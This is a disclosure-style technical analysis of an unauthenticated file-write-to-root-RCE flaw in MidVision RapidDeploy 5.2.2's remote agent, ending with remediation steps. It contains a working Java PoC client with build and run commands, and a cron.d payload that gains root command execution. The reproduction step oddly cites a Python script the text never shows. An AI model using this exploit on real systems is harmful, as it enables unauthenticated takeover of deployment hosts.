# MidVision RapidDeploy Remote Agent Unauthenticated Arbitrary File Write RCE — Full Technical Analysis

## Product Background

- **Vendor**: MidVision
- **Product**: RapidDeploy 5.2.2
- **Category**: CI/CD deployment orchestration
- **Stack**: JBoss Remoting 2.5.4.SP5 bisocket remote-execution protocol; HTTP layer (9090 `/MidVision` + `/ws/*` REST); remote agent layer (20000 bisocket / 20443 sslbisocket)
- **Agent**: built-in agent (127.0.0.1) + remote agent (`midvision-remoting-server.xml` template)

## Stage 0 — Prerequisites / Authentication Boundary

Two network attack surfaces:

1. **HTTP layer (9090 `/MidVision` + `/ws/*` REST)**: Spring Security `permitAll` for `/ws/*` (filter does not block) + per-method `@RequestHeader("Authorization")` → `callService` → `AbstractWebService.login` → `WebServiceEncrypter.decode` (base64(user:PREFIX_PWD+3DES(ENCRYPTION_KEY+user,pwd))) → `DbAuthenticationProviderImpl`. Bad token → 401; no token → 400. **The auth gate is hard, not fail-open.**
2. **remote agent layer (20000 bisocket / 20443 sslbisocket)**: all invocations go through `SecureServerInvocationHandler.invoke` → `isAuthorised(server,username,password,guitoken,uuid)` → on pass `secureInvoke`. **The vulnerability is in this layer.**

Remote-agent deployment forms:
- **built-in agent** (control server itself, `BuiltInAgentBean.doAgentSetup`): `host=127.0.0.1`, local-only. Same code path, same auth gate, same sink — used for mechanism verification
- **remote agent** (`midvision-remoting-server.xml` template, `StartAgent` orchestration task deploys to target nodes): vendor-shipped `host=0.0.0.0` + `auth.servers` commented out → **network-reachable + no auth**. This is the standard RapidDeploy CI/CD deployment shape (agent installed on remote target servers); in real deployments remote agents are commonly exposed on 0.0.0.0 with an empty default auth.servers

## Stage 1 — Sink Identification

`CopyObjectServer.RapidDeployCopyObjectHandler.secureInvoke` (arbitrary file write sink):

```java
// extract/all_src/rapiddeploy-remoting-remoting/.../server/CopyObjectServer.java
public Object secureInvoke(InvocationRequest invocation) throws Throwable {
    HashMap sendPayload = (HashMap)invocation.getParameter();
    String filePath = (String)sendPayload.get("filePath");
    byte[] fileContents = (byte[])sendPayload.get("fileContents");
    Boolean agentComponent = (Boolean)sendPayload.get("agentComponent");
    Long finalSize = (Long)sendPayload.get("finalSize");
    Boolean append = (Boolean)sendPayload.get("append");
    String uuid = (String)sendPayload.get("uuid");
    if (uuid == null || uuid.trim().isEmpty()) { uuid = "temp"; }
    File outputFile = new File(filePath);                       // ⭐ attacker-controlled path
    if (agentComponent.booleanValue()) {
        // redirects to agent lib path
    }
    // else: outputFile = new File(filePath) — EXACT PATH, NO validation
    File tempFile = new File(outputFile.getAbsolutePath() + "." + uuid);
    outputFile.getParentFile().mkdirs();                        // creates arbitrary directories
    FileOutputStream fos = new FileOutputStream(tempFile, append != null ? append : false);
    fos.write(fileContents);                                    // ⭐ arbitrary file write
    // ... renameTo(outputFile)
}
// setupServer registers: this.addInvocationHandler("RapidDeployCopyHandler", invocationHandler);
```

**Sink characteristics**: `filePath` attacker-controlled + `new File(filePath)` zero validation (no whitelist/path restriction/extension filter) + `getParentFile().mkdirs()` creates arbitrary directories + `FileOutputStream.write(fileContents)` writes arbitrary content. The agent process runs as root (cloud deployment) → writing `/etc/cron.d/x` or a webshell = root RCE.

There are also `RapidDeployCommandInvocationHandler` (`command` string → `JobRunner` runs batch-definition XML, less clean) and `RapidDeployAdd2ClasspathHandler` (adds a jar to the classpath). This finding uses the cleanest `RapidDeployCopyHandler`.

## Stage 2 — Source Identification

Source = a HashMap payload invoked by a JBoss Remoting bisocket client. Client construction (`AbstractStreamingClient.sendStreamChunk`):

```java
// extract/all_src/rapiddeploy-remoting-remoting/.../client/AbstractStreamingClient.java:665-710
protected void sendStreamChunk(InvokerLocator locator, boolean agentComponent, UUID uuid, boolean guiToken,
                               byte[] fileContents, Long size, Boolean append, String remoteFilePath) {
    HashMap<String, Object> params = new HashMap<String, Object>();
    params.put("filePath", remoteFilePath);
    params.put("fileContents", fileContents);
    params.put("append", append);
    params.put("finalSize", size);
    params.put("uuid", uuid.toString());
    params.put("hostname", this.getHostname());
    params.put("username", this.username);
    params.put("password", this.password);
    params.put("token", this.getToken(this.username, guiToken, uuid));
    params.put("agentComponent", agentComponent);
    Object response = this.executeCallbackCommand(locator, "RapidDeployCopyHandler", params);
}
```

The attacker replicates an equivalent HashMap with **all credential fields null** (hostname/username/password/token) and controls filePath/fileContents/agentComponent=false.

## Stage 3 — Data Flow

```
Attacker (bisocket client, null creds)
  → org.jboss.remoting.Client.invoke(params)  [bisocket://<host>:20000/]
  → SecureServerInvocationHandler.invoke(invocation)
    → HashMap sendPayload = invocation.getParameter()
    → uuid/hostname/username/password/guitoken = sendPayload.get(...)  // all null
    → isAuthorised(null, null, null, null, "exploit-1")
      → if (backwardCompatibility && username==null && server==null) return true;  // line 69-72 (built-in always true)
      → if (authServers.isEmpty()) return true;                                    // line 75 (default empty → true) ⭐
    → secureInvoke(invocation)  // auth passed
      → CopyObjectServer.secureInvoke
        → filePath = "/etc/cron.d/rd_rce_proof"
        → fileContents = "* * * * * root id > /tmp/rd_cron_rce_executed 2>&1\n"
        → agentComponent = false
        → new File(filePath) + FileOutputStream.write(fileContents)  // ⭐ arbitrary file write as root
  → crond reads /etc/cron.d/rd_rce_proof → executes `id > /tmp/rd_cron_rce_executed`
  → /tmp/rd_cron_rce_executed = "uid=0(root) gid=0(root) groups=0(root)"  ⭐ root RCE
```

## Stage 4 — Injection / Exploitation Construction

**Auth-bypass root cause** (`SecureServerInvocationHandler.isAuthorised`):

```java
// extract/all_src/rapiddeploy-remoting-remoting/.../server/SecureServerInvocationHandler.java
protected static boolean isAuthorised(String server, String username, String password, String guitoken, String uuid) {
    if (backwardCompatibility && username == null && server == null) { return true; }  // line 69-72
    String rdGuiToken = username + uuid + server;
    if (authServers.isEmpty()) { return true; }                                       // line 75 ⭐
    EnvironmentProperty passwordProperty = new EnvironmentProperty(username, password);
    return authServers.contains(new AuthServer(server)) || ...;
}
public static void setAuthServers(String servers) {
    if (StringUtils.isBlank((CharSequence)servers)) {
        log.info((Object)"Authorised Server NOT DEFINED.");
        return;  // authServers stays empty ArrayList
    }
    authServers = new ArrayList<AuthServer>();
    // ... parse servers
}
```

Two bypass paths:
- **Path A (primary)**: `authServers.isEmpty() → return true` (line 75). Default `auth.servers=` empty → `setAuthServers(blank)` does not populate the list → `authServers` stays empty → unconditional pass
- **Path B (built-in)**: `backwardCompatibility && username==null && server==null → return true` (line 69-72). Built-in agent `backwardCompatibility=true` always holds + attacker sends null credentials → pass

**Default config evidence (shipped, not a self-made misconfig)**:
- `WEB-INF/classes/rapiddeploy_default.properties:531` `rapiddeploy.built.in.remote.agent.auth.servers=` (empty)
- `bin/rapiddeploy.properties:263` `rapiddeploy.built.in.remote.agent.enabled=true` (raw zip shipped)
- `remoting/midvision-remoting-server.xml` (remote-agent template): `<parameter name="host">0.0.0.0</parameter>` + `<!-- <parameter name="auth.servers">...</parameter> -->` (commented out → empty)
- Runtime log: `SecureServerInvocationHandler:setAuthServers - Authorised Server NOT DEFINED.`

**bisocket has no SSL mutual auth**: `RemotingHelper.createServerConnector` (line 345 else branch) uses no socket factory for bisocket → no mutual TLS. `SecureHandShakeServer` is a separate subsystem, not a prerequisite gate.

**PoC client** (Java, `RdUnauthCopyHandler.java`):

```java
import org.jboss.remoting.Client;
import org.jboss.remoting.InvokerLocator;
import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap;

public class RdUnauthCopyHandler {
    public static void main(String[] args) throws Throwable {
        String targetPath = args[0];          // /etc/cron.d/rd_rce_proof
        String contentsArg = args[1];         // @/tmp/rd_cron_payload.txt
        byte[] contents = contentsArg.startsWith("@")
            ? Files.readAllBytes(Paths.get(contentsArg.substring(1)))
            : contentsArg.getBytes("UTF-8");
        InvokerLocator locator = new InvokerLocator("bisocket://127.0.0.1:20000/");
        Client client = new Client(locator, "RapidDeployCopyHandler");
        client.connect();
        HashMap<String, Object> params = new HashMap<String, Object>();
        params.put("filePath", targetPath);
        params.put("fileContents", contents);
        params.put("append", Boolean.FALSE);
        params.put("finalSize", (long) contents.length);
        params.put("uuid", "exploit-1");
        params.put("agentComponent", Boolean.FALSE);
        params.put("hostname", null);   // ⭐ no credentials
        params.put("username", null);
        params.put("password", null);
        params.put("token", null);
        Object response = client.invoke(params);   // → isAuthorised true → secureInvoke arbitrary file write
        client.disconnect();
    }
}
```

**cron.d payload** (`/tmp/rd_cron_payload.txt`, `printf '* * * * * root id > /tmp/rd_cron_rce_executed 2>&1\n'`): cron.d files need a trailing newline; read raw bytes with `@file` (`Files.readAllBytes` preserves `0a`), not `$(cat)` (bash command substitution strips the trailing newline).

## Stage 5 — Dynamic Verification

Environment: cloud host, MV_HOME set, built-in agent running as root, 20000 bound to 127.0.0.1, crond running.

Compile & run (system javac 17 to compile; bundled JRE 21 to run + three add-opens):
```bash
MV=<rapiddeploy home>
WEBLIB=$MV/web-apps/tomcat/webapps/MidVision/WEB-INF/lib
EXTLIB=$MV/ext-lib
JAVA=$MV/web-apps/jre/bin/java
OPENS="--add-opens java.base/java.io=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED"
javac -cp ".:$WEBLIB/*:$EXTLIB/*" RdUnauthCopyHandler.java
printf '* * * * * root id > /tmp/rd_cron_rce_executed 2>&1\n' > /tmp/rd_cron_payload.txt
$JAVA $OPENS -cp ".:$WEBLIB/*:$EXTLIB/*" RdUnauthCopyHandler /etc/cron.d/rd_rce_proof @/tmp/rd_cron_payload.txt
```

PoC stdout:
```
[*] Connecting unauth to bisocket://127.0.0.1:20000/ subsystem=RapidDeployCopyHandler
[*] Connected: true
[*] Invoking RapidDeployCopyHandler (no credentials) -> writing /etc/cron.d/rd_rce_proof (51 bytes)
[+] Response: 51
[+] Done. Verify: cat /etc/cron.d/rd_rce_proof
```

Target-side verification:
- `/etc/cron.d/rd_rce_proof`: `-rw-r----- 1 root root 51`, content `* * * * * root id > /tmp/rd_cron_rce_executed 2>&1\n` (trailing 0a confirmed via xxd)
- 70s later crond executed → `/tmp/rd_cron_rce_executed`: `-rw-r--r-- 1 root root 39`, content **`uid=0(root) gid=0(root) groups=0(root)`**

**Unauthenticated (null credentials → isAuthorised true) + arbitrary-path file write as root + cron command execution = unauthenticated root RCE.**

## Stage 6 — Reachability

- **built-in agent** (127.0.0.1:20000): local-only, used for mechanism verification (same code path, same auth gate, same sink). Reachable via SSRF/container escape/adjacent RCE
- **remote agent** (`midvision-remoting-server.xml` template, shipped `host=0.0.0.0` + `auth.servers` commented empty): network-reachable unauthenticated arbitrary file write → root RCE. This is the standard RapidDeploy CI/CD deployment shape (agent installed on remote target servers); real deployments commonly expose remote agents on 0.0.0.0 with empty default auth.servers. **A shipped default deployment template vulnerability, not a self-made misconfig.**

## Stage 7 — Defense in Depth / Remediation

1. **Require non-empty auth.servers**: `setAuthServers(blank)` must not silently return; refuse to start the agent or force configuration
2. **Remove `authServers.isEmpty() → true` short-circuit** (line 75): an empty list should default to deny, not allow
3. **Remove `backwardCompatibility && username==null && server==null → true`** (line 69-72): legacy compatibility must not bypass authentication
4. **CopyHandler path whitelist**: `filePath` must be restricted to the agent working/temp directory; forbid absolute paths / `..` / sensitive dirs (`/etc/cron.d`, `/etc/cron.{hourly,daily}`, webroot, startup scripts)
5. **bisocket TLS mutual auth**: remote agents should enable mutual TLS by default (the current `RemotingHelper:345` else branch has no socket factory)
6. **Remote-agent template default `host=127.0.0.1`**: the shipped `midvision-remoting-server.xml` `host=0.0.0.0` should be `127.0.0.1`; remote exposure must be explicit + enforce auth.servers

## Reproduction

```bash
# 1. deploy RapidDeploy 5.2.2 (default config: agent enabled + auth.servers empty)
# 2. compile & run the PoC (requires the product's jboss-remoting jar + bundled JRE 21)
python3 exploit.py 127.0.0.1 20000 /etc/cron.d/rd_rce_proof '@/tmp/rd_cron_payload.txt'
# 3. wait ~70s, verify
cat /tmp/rd_cron_rce_executed  # uid=0(root)
```

## CWE / CVSS

- CWE-306 (Missing Authentication) — empty `authServers` unconditional allow; backward-compatibility null-credential bypass
- CWE-22 (Path Traversal) / CWE-434 (Unrestricted Upload) — arbitrary-path file write
- CWE-78 (OS Command Injection) — cron command execution as root
- **CVSS 3.1**: ≈ 9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) — PR:N because the remote agent is unauthenticated by default
